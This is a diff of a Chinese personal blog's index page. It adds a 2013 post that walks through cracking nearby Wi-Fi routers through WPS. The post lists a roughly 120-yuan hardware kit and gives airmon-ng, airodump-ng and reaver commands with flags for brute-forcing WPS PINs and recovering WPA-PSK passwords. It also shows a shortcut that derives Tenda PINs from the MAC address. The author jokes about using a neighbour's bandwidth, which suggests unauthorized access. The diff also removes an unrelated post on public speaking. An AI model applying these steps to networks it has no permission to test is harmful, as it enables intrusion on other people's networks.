@@ -9,7 +9,7 @@
   <meta name="author" content="ourren">
 
   
-  <meta name="description" content="前言 原来经常在别人博客、书或者论文中上看到weka这个数据挖掘工具，经常被用于试验数据测试、真实数据分析等。今天无意中翻阅到IBM技术博客中对weka有一个系统教程：“用weka进行数据挖掘”，教程分为1、2、3三部分（链接见参考文章1，非常不错，推荐大家阅读）， &hellip;">
+  <meta name="description" content="最近在淘宝入手了一套8187芯片主板与14DB平板天线，用我的老爷笔记本做了下测试，结果测试效果还行，邻居的电信带宽速度也不错。 具体涉及的无线安全技术：主要是扫描开放有WPS功能的无线路由器，然后通过开源软件reaver来暴力破解pin码，最后通过pin来得到无线路由器WPA-PSK密码。 &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -67,6 +67,121 @@
     <div id="content">
       <div class="blog-index">
   
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/2013/11/07/wireless_security_wps/">无线安全之WPS</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2013-11-07T00:00:00-08:00'><span class='date'><span class='date-month'>Nov</span> <span class='date-day'>7</span><span class='date-suffix'>th</span>, <span class='date-year'>2013</span></span> <span class='time'>12:00 am</span></time>
+        
+        
+            | <a href="/2013/11/07/wireless_security_wps/#comments">留言</a>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p><img class="aligncenter" alt="wireless_attch_wps" src="http://blog.ourren.com/blog/wireless_attach.jpg" width="500" height="302"></p>
+
+<p>最近在淘宝入手了一套8187芯片主板与14DB平板天线，用我的老爷笔记本做了下测试，结果测试效果还行，邻居的电信带宽速度也不错。</p>
+
+<p>具体涉及的无线安全技术：主要是扫描开放有WPS功能的无线路由器，然后通过开源软件reaver来暴力破解pin码，最后通过pin来得到无线路由器WPA-PSK密码。前面暴力破解时间稍微比较长，后面这个过程可以说是秒杀。</p>
+
+<h3>配置</h3>
+
+
+<p>基本配置就如下所示，出了笔记本电脑外其它就价格也就RMB120块左右。</p>
+
+<p><em>8187 芯片主板</em>
+<em>14DB平板天线</em>
+<em>3米 USB2.0延长线</em>
+<em>安装Linux 系统的笔记本</em></p>
+
+<p>话说14DB的平板天线看起来还是很霸气的，关于事事如意18DB天线也测试了下效果差不多，不知道是不是楼层的问题。</p>
+
+<h3>准备工作</h3>
+
+
+<p>安装驱动和工具(aircrack-ng和reaver)，Ubuntu可以直接APT，其它系统可以需要下载源码安装，不过都很简单。</p>
+
+<p><em>sudo apt-get install aircrack-ng </em>
+<em>sudo apt-get install reaver</em></p>
+
+<h3>破解过程</h3>
+
+
+<p>1、开启网卡的监控模式</p>
+
+<p>sudo airmon-ng start wlan0</p>
+
+<p>2、扫描附近的无线信号</p>
+
+<p>sudo airodump-ng mon0</p>
+
+<p>在这个过程中你会看到很多无线信号，主要观察几个参数 ：PWR(信号强度，越小越好)，MB(需要为54e.)。</p>
+
+<p>BSSID      PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
+68:53:21:E3:30:BE  -1 0 0 0 143 -1 &lt;length: 0>
+BC:D1:77:25:76:84 -47 50 2 0 1 54e WPA2 CCMP PSK fire
+C8:3A:35:55:42:E8 -44 35 0 0 8 54e WPA CCMP PSK Tenda_5542E8
+1C:FA:68:1C:7D:D6 -56 30 0 0 6 54e. WPA2 CCMP PSK hool
+A8:15:4D:83:6A:24 -51 29 5 0 11 54e. WPA2 CCMP PSK show
+F4:EC:38:3D:02:B6 -53 19 0 0 1 54e. WPA2 CCMP PSK</p>
+
+<p>这里特别强调下Tenda路由器可以秒杀，其路由器的MAC前面地址为： C8:3A:35，后面6为是pin的前8位的十六进制。因此只需要复制MAC地址的后6位，然后转为十进制，就可以得到PIN码的前面的数字了。</p>
+
+<p>3、破解PIN码</p>
+
+<p>sudo reaver -i mon0 -b MAC -a -S -vv -d 0 -c 1</p>
+
+<p>知道PIN前面的数字的时候可以用下面这个命令：</p>
+
+<p>sudo reaver -i mon0 -b MAC -a -S -vv -d 0 -c 6 -p 40000</p>
+
+<p>-b 后面跟MAC地址</p>
+
+<p>-c 频道，从扫描结果看</p>
+
+<p>然后就开始破解了，等4个小时左右基本上可以搞定。</p>
+
+<p>附上reaver调整参数的一些小技巧</p>
+
+<p>reaver:</p>
+
+<p>-i 监听后接口名称</p>
+
+<p>-b 目标mac地址</p>
+
+<p>-a 自动检测目标AP最佳配置</p>
+
+<p>-S 使用最小的DH key（可以提高PJ速度）</p>
+
+<p>-vv 显示更多的非严重警告</p>
+
+<p>-d 即delay每穷举一次的闲置时间 预设为1秒</p>
+
+<p>-t 即timeout每次穷举等待反馈的最长时间</p>
+
+<p>-c 指定频道可以方便找到信号</p>
+
+<p> </p>
+</div>
+  
+  
+
+
+    </article>
   
   
     <article>
@@ -479,80 +594,6 @@ YII默认控制器
 <p>Windows XP: junction D:\Zotero\storage E:\sync\Zotero\storage</p>
 
 <p>其中：<a href="http://download.sysinternals.com/files/Junction.zip" target="_blank">junction</a>可以在MS网站上<a href="http://download.sysinternals.com/files/Junction.zip" target="_blank">下载</a>.</p>
-</div>
-  
-  
-
-
-    </article>
-  
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/2013/03/24/lecture_is_an_art/">培训是一门艺术</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-<time class='entry-date' datetime='2013-03-24T00:00:00-07:00'><span class='date'><span class='date-month'>Mar</span> <span class='date-day'>24</span><span class='date-suffix'>th</span>, <span class='date-year'>2013</span></span> <span class='time'>12:00 am</span></time>
-        
-        
-            | <a href="/2013/03/24/lecture_is_an_art/#comments">留言</a>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p><img class="aligncenter" alt="差别对待看你怎么看" src="http://blog.ourren.com/blog/chabieduidai.jpg" width="522" height="150"></p>
-
-<p>现在社会中存在很多“差别对待”问题：比如说最近很火的“3.15苹果事件&#8221;，日常生活中科技产品、汽车业、求职与工作等也经常出现这种问题，当人们遇到这种事情的时候首先想到不对等待遇，需要采用法律手段维护权利。但是有时候还真的需要采用差别对待才能把事情做好，当然这个跟上面提到的用户权利有所差别，最近小编就遇到了这方面的小问题，特此记录下。</p>
-
-<p>最近博主由于其他原因去给“<em>初中生</em>”讲讲计算机基础，由于个人原来在小组和其他人员也有做过计算机类技术分享和一些课程讲解，再说自认为个人在Windows软硬件基础、移动平台、互联网发展等方面有比较深入的理解，因此准备的时候就网上随便找了下课件稍微修改了下，自我感觉不错。在实际讲解中，从计算机发展讲到计算机硬件、到移动互联网发展、到桌面与移动平台操作系统发展等，虽然在讲解的时候跟下面进行交流，但是他们基本上不发言，导致效果真的很差。讲完后跟他们进行了沟通，发现他们虽然很感兴趣，但是基本上听不懂。</p>
-
-<p>回来后进行了思考，归纳下主要有几方面问题：</p>
-
-<div>
-<ul>
-    <li>对象不同，需要差别对待</li>
-</ul>
-面对不同对象，需要差别对待。针对培训或者演讲你需要的是将大部分人讲懂，因此你需要站在大部分人的基础水平上进行讲解，不能脱离大众而偏向个别群体。互联网中各类产品又未尝不是：软件产品一般分为免费版与收费版，微博分为个人版与企业版，就连大数据分析也需要结合你的兴趣、爱好进行个人性定制等。
-<ul>
-    <li>任何事准备总是需要的</li>
-</ul>
-机会是留给有准备的人。当机会来了就需要好好准备，认真对待每一次生活琐事与大挑战。不管这件事有大小，当你完成之后，你总会有所收获的。你看台湾或者美国选举，领导人为了宣扬政策与方案，会尽全力准备和演讲；就连路边卖烧烤的阿姨这些每天都会为第二天做准备。我们又为何不好好事前准备呢，不管有多忙，时间挤挤总会有的，关键看你以什么心态面对。
-
-</div>
-
-
-<div>
-<ul>
-    <li>演讲是一门学问</li>
-</ul>
-</div>
-
-
-<p>从《国王的演讲》到奥斯卡获奖，其突出的就是英王乔治六世在矫正专家的帮助下，克服口吃，成功发表了激励民心的战前演讲，不得不说演讲真的是一门大学问。国内外安全会议众多，比如xkungfoo、blackhat、CanSecWest、OWASP、SyScan360等，如何将你的议题分享并得到大家的认可和支持是不容易的，当然这个涉及到你的议题、会议的参会人员关注方向与水平。</p>
-
-<div>
-<ul>
-    <li>书籍推荐</li>
-</ul>
-</div>
-
-
-<p>在豆瓣上看到一本关于演讲方面不错的书籍，特此推荐下（不方面购买纸质书籍的，可以安装“书香云集”然后搜索下载）。</p>
-
-<p>[美]史迪芬.E.卢卡斯 著  译者: 俞振伟 <a href="http://book.douban.com/subject/2343561/">《演讲的艺术》</a></p>
-
-<div></div>
-
 </div>
   
   
